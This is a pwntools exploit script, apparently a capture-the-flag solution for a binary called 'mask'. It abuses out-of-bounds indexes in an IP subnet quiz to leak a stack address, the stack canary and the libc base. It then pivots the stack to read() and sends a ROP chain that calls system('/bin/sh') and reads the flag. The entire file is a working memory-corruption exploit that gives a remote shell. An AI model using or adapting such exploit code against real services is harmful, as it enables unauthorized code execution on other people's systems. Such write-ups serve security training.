#!/usr/bin/env python3

from pwn import *
from ipaddress import ip_address
import sys

url = sys.argv[1].split(":")

context.arch = "amd64"
#context.log_level = 'error'

context.binary = exe = ELF("./mask", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def conn():
	return remote(url[0], int(url[1]))

def answer(io: tube, idx: int, val: int):
	io.sendlineafter(b"> ", str(idx).encode())

	io.recvuntil(b"prefix of ")
	addr = int(ip_address(io.recvuntil(b' ', drop=True).decode()))

	io.recvuntil(b"subnet mask: ")
	mask = int(ip_address(io.recvuntil(b')', drop=True).decode()))

	io.sendlineafter(b": ", str(val).encode())
	
	return addr, mask

def leak(io: tube, idx: int):
	a, m = answer(io, idx, 0)
	return (m << 32) + a

def main():
	r = conn()
	context.log_level = "error"

	stack = leak(r, 12)
	log.info(f"stack @ 0x{stack:x}")
	questions = stack - 0x168
	log.info(f"questions @ 0x{questions:x}")

	canary = leak(r, 92) >> 8 << 8
	log.info(f"canary: 0x{canary:x}")

	libc.address = leak(r, -211)  - libc.sym['_IO_file_jumps']
	log.info(f"libc @ 0x{libc.address:x}")

	new_bp = stack - 0x1b0 - 8
	for i in range(1, 8):
		r.sendline(str(i).encode())
		r.sendline(p64(libc.sym["read"])) # read

	r.sendafter(b"Enter your email to get the results: ", flat(canary, new_bp)) # pivot to read, registers already setup for read(0, new_stack, 0x10)

	# 0x00000000000f9de8 : mov edx, 0x7f ; cmovne rax, rdx ; ret

	r.send(flat(libc.address + 0x00000000000f9de8, libc.sym["read"])) # transform into read(0, new_stack, 0x7f)

	rop = ROP([libc])
	rop.raw(rop.ret.address)
	rop.system(next(libc.search(b"/bin/sh\x00")))

	payload = b"A"*0x10 + \
		rop.chain()

	r.send(payload)
	sleep(0.5)
	r.sendline(b"cat flag")
	print(r.recvlines(2)[1].decode())

if __name__ == "__main__":
	main()
